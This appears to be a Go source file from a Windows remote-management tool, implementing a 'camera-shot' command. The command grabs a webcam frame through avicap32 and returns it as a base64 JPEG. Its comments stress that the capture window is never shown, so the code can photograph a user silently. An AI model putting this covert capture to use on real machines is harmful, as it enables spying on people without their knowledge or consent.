//go:build windows

package commands

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"image"
	"image/color"
	"image/jpeg"
	"strconv"
	"strings"
	"syscall"
	"unsafe"
)

// Remote camera via Video-for-Windows (avicap32, present on every Windows):
// open driver 0, grab one frame to the clipboard as DIB, parse pixels,
// return data-URL JPEG. No dependencies, no visible window (capture window
// is WS_POPUP, never shown).

var (
	modAvicap32  = syscall.NewLazyDLL("avicap32.dll")
	modUser32Cam = syscall.NewLazyDLL("user32.dll")
	modKern32Cam = syscall.NewLazyDLL("kernel32.dll")

	procCapCreate = modAvicap32.NewProc("capCreateCaptureWindowA")
	procSendMsgA  = modUser32Cam.NewProc("SendMessageA")
	procDestroyW  = modUser32Cam.NewProc("DestroyWindow")
	procOpenClip  = modUser32Cam.NewProc("OpenClipboard")
	procCloseClip = modUser32Cam.NewProc("CloseClipboard")
	procGetClip   = modUser32Cam.NewProc("GetClipboardData")
	procGlobLock  = modKern32Cam.NewProc("GlobalLock")
	procGlobUnlock = modKern32Cam.NewProc("GlobalUnlock")
	procGlobSize  = modKern32Cam.NewProc("GlobalSize")
)

const (
	wmCapDriverConnect    = 0x40A
	wmCapDriverDisconnect = 0x40B
	wmCapEditCopy         = 0x41E
	wmCapGrabFrame        = 0x43C
	cfDIB                 = 8
	wsPopup               = 0x80000000
)

func capSend(hwnd, msg, w, l uintptr) uintptr {
	r, _, _ := procSendMsgA.Call(hwnd, msg, w, l)
	return r
}

// captureCameraJPEG grabs one frame at roughly maxW wide, JPEG quality q.
func captureCameraJPEG(maxW, q int) ([]byte, error) {
	name, _ := syscall.BytePtrFromString("RMM")
	hwnd, _, _ := procCapCreate.Call(
		uintptr(unsafe.Pointer(name)), wsPopup, 0, 0, 320, 240, 0, 0)
	if hwnd == 0 {
		return nil, fmt.Errorf("no camera (capture window failed)")
	}
	defer procDestroyW.Call(hwnd)
	if capSend(hwnd, wmCapDriverConnect, 0, 0) == 0 {
		return nil, fmt.Errorf("no camera (driver connect failed — in use or absent)")
	}
	defer capSend(hwnd, wmCapDriverDisconnect, 0, 0)
	capSend(hwnd, wmCapGrabFrame, 0, 0)
	capSend(hwnd, wmCapEditCopy, 0, 0)
	r, _, _ := procOpenClip.Call(0)
	if r == 0 {
		return nil, fmt.Errorf("no camera (clipboard open failed)")
	}
	defer procCloseClip.Call()
	h, _, _ := procGetClip.Call(cfDIB)
	if h == 0 {
		return nil, fmt.Errorf("no camera (empty frame)")
	}
	sz, _, _ := procGlobSize.Call(h)
	if sz == 0 || sz > 100<<20 {
		return nil, fmt.Errorf("no camera (bad frame size)")
	}
	ptr, _, _ := procGlobLock.Call(h)
	if ptr == 0 {
		return nil, fmt.Errorf("no camera (lock failed)")
	}
	defer procGlobUnlock.Call(h)
	raw := (*[1 << 30]byte)(unsafe.Pointer(ptr))[:int(sz):int(sz)]
	img, err := dibToImage(raw)
	if err != nil {
		return nil, err
	}
	// Downscale to maxW preserving aspect.
	b := img.Bounds()
	w, hh := b.Dx(), b.Dy()
	if w > maxW && w > 0 {
		nh := hh * maxW / w
		if nh < 1 {
			nh = 1
		}
		dst := image.NewRGBA(image.Rect(0, 0, maxW, nh))
		for y := 0; y < nh; y++ {
			sy := y * hh / nh
			for x := 0; x < maxW; x++ {
				sx := x * w / maxW
				dst.Set(x, y, img.At(sx, sy))
			}
		}
		img = dst
	}
	var buf bytes.Buffer
	if err := jpeg.Encode(&buf, img, &jpeg.Options{Quality: q}); err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}

// dibToImage parses a CF_DIB blob (BITMAPINFOHEADER + pixels, 24/32-bit).
func dibToImage(raw []byte) (image.Image, error) {
	if len(raw) < 40 {
		return nil, fmt.Errorf("DIB too small")
	}
	u32 := func(o int) uint32 {
		return uint32(raw[o]) | uint32(raw[o+1])<<8 | uint32(raw[o+2])<<16 | uint32(raw[o+3])<<24
	}
	i32 := func(o int) int32 { return int32(u32(o)) }
	if u32(0) < 40 {
		return nil, fmt.Errorf("unsupported DIB header")
	}
	w, h := int(i32(4)), int(i32(8))
	bpp := int(uint32(raw[14]) | uint32(raw[15])<<8)
	if w <= 0 || h == 0 || w > 8192 || h > 8192 || h < -8192 {
		return nil, fmt.Errorf("bad DIB dims")
	}
	topDown := false
	if h < 0 {
		topDown = true
		h = -h
	}
	off := int(u32(0))
	if off < 40 || off > len(raw) {
		return nil, fmt.Errorf("bad DIB offset")
	}
	dst := image.NewRGBA(image.Rect(0, 0, w, h))
	switch bpp {
	case 24:
		stride := (w*3 + 3) &^ 3
		if off+stride*h > len(raw) {
			return nil, fmt.Errorf("DIB truncated")
		}
		for y := 0; y < h; y++ {
			sy := y
			if !topDown {
				sy = h - 1 - y
			}
			row := raw[off+sy*stride:]
			for x := 0; x < w; x++ {
				dst.SetRGBA(x, y, colorRGBA(row[x*3+2], row[x*3+1], row[x*3]))
			}
		}
	case 32:
		stride := w * 4
		if off+stride*h > len(raw) {
			return nil, fmt.Errorf("DIB truncated")
		}
		for y := 0; y < h; y++ {
			sy := y
			if !topDown {
				sy = h - 1 - y
			}
			row := raw[off+sy*stride:]
			for x := 0; x < w; x++ {
				dst.SetRGBA(x, y, colorRGBA(row[x*4+2], row[x*4+1], row[x*4]))
			}
		}
	default:
		return nil, fmt.Errorf("unsupported DIB depth %d", bpp)
	}
	return dst, nil
}

func colorRGBA(r, g, b byte) color.RGBA { return color.RGBA{r, g, b, 0xff} }

// cameraShot implements: camera-shot [quality 1-100, default 60].
// Returns a data-URL JPEG (UI sniffs the prefix into the camera modal).
func cameraShot(args string) (string, error) {
	q := 60
	if a := strings.TrimSpace(args); a != "" {
		if v, err := strconv.Atoi(a); err == nil && v >= 1 && v <= 100 {
			q = v
		}
	}
	jpg, err := captureCameraJPEG(640, q)
	if err != nil {
		return "", err
	}
	return "data:image/jpeg;base64," + base64.StdEncoding.EncodeToString(jpg), nil
}
